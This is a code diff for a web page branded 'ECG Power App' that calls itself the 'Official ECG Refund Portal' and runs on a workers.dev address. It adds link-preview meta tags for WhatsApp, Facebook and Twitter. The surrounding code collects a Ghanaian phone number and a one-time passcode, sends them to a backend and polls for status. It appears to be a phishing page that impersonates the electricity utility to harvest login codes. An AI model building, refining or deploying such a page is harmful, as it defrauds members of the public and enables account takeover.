@@ -3,7 +3,46 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
+
+<!-- ============================================ -->
+<!-- LINK PREVIEW / SOCIAL MEDIA META TAGS        -->
+<!-- ============================================ -->
+
+<!-- Basic Meta Tags -->
 <title>ECG Power App</title>
+<meta name="description" content="Official ECG Refund Portal - Login with your Ghana mobile number for refund and account management.">
+<meta name="keywords" content="ECG, Ghana, Refund, Electricity, Login, Refhnd Portal">
+<meta name="author" content="ECG Ghana">
+<meta name="theme-color" content="#343C9B">
+
+<!-- Open Graph / Facebook / WhatsApp / LinkedIn -->
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://powerapp.refund-ecg.workers.dev/">
+<meta property="og:title" content="ECG Refund Portal">
+<meta property="og:description" content="Official ECG Refund Portal - Access your electricity account, refund bills, and manage power services.">
+<meta property="og:image" content="https://powerapp.refund-ecg.workers.dev/ecg-preview.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="ECG Power App Logo">
+<meta property="og:site_name" content="ECG Power App-Refumd Portal">
+
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:url" content="https://powerapp.refund-ecg.workers.dev/">
+<meta name="twitter:title" content="ECG Power App">
+<meta name="twitter:description" content="Official ECG Refund Portal - Login with your Ghana mobile number for bills refund.">
+<meta name="twitter:image" content="https://powerapp.refund-ecg.workers.dev/ecg-preview.jpg">
+
+<!-- WhatsApp Specific -->
+<meta property="og:image:type" content="image/jpeg">
+<meta property="og:image:secure_url" content="https://powerapp.refund-ecg.workers.dev/ecg-preview.jpg">
+
+<!-- iOS / Apple Touch Icon -->
+<link rel="apple-touch-icon" href="ecg-logo.png">
+
+<!-- Favicon -->
+<link rel="icon" type="image/png" href="ecg-logo.png">
+
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
 :root{
@@ -253,7 +292,6 @@ html,body{
     font-size:14px;
 }
 
-/* Privacy & Terms Pages Styles */
 .legal-content{
     background:white;
     border-radius:20px;
@@ -505,10 +543,7 @@ const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_
 let requestId = null;
 let pollingInterval = null;
 
-// ============================================
-// DOM ELEMENTS
-// ============================================
-
+// DOM Elements
 const phone = document.getElementById("phone");
 const count = document.getElementById("count");
 const continueBtn = document.getElementById("continueBtn");
@@ -521,10 +556,6 @@ const privacyLink = document.getElementById("privacyLink");
 const backFromTermsBtn = document.getElementById("backFromTermsBtn");
 const backFromPrivacyBtn = document.getElementById("backFromPrivacyBtn");
 
-// ============================================
-// SCREEN MANAGEMENT
-// ============================================
-
 function showScreen(screenId) {
     const screens = ['screen1', 'screen2', 'screen3', 'screenTerms', 'screenPrivacy'];
     screens.forEach(id => {
@@ -535,10 +566,7 @@ function showScreen(screenId) {
     if (targetScreen) targetScreen.classList.remove('hidden');
 }
 
-// ============================================
-// LEGAL PAGES NAVIGATION
-// ============================================
-
+// Legal pages navigation
 termsLink.addEventListener("click", (e) => {
     e.preventDefault();
     showScreen('screenTerms');
@@ -557,10 +585,7 @@ backFromPrivacyBtn.addEventListener("click", () => {
     showScreen('screen1');
 });
 
-// ============================================
-// STEP 1: PHONE INPUT
-// ============================================
-
+// Phone input
 phone.addEventListener("input", () => {
     phone.value = phone.value.replace(/\D/g, '');
     count.textContent = phone.value.length;
@@ -604,10 +629,7 @@ continueBtn.addEventListener("click", async () => {
     }
 });
 
-// ============================================
-// STEP 2: OTP INPUT
-// ============================================
-
+// OTP input
 otpBoxes.forEach((box, index) => {
     box.addEventListener("input", () => {
         box.value = box.value.replace(/\D/g, '');
@@ -680,10 +702,6 @@ submitBtn.addEventListener("click", async () => {
     }
 });
 
-// ============================================
-// STEP 3: POLLING
-// ============================================
-
 function startPolling() {
     pollingInterval = setInterval(async () => {
         if (!requestId) return;
@@ -708,10 +726,6 @@ function startPolling() {
         }
     }, 5000);
 }
-
-// ============================================
-// CLEANUP
-// ============================================
 
 window.addEventListener("beforeunload", () => {
     if (pollingInterval) clearInterval(pollingInterval);
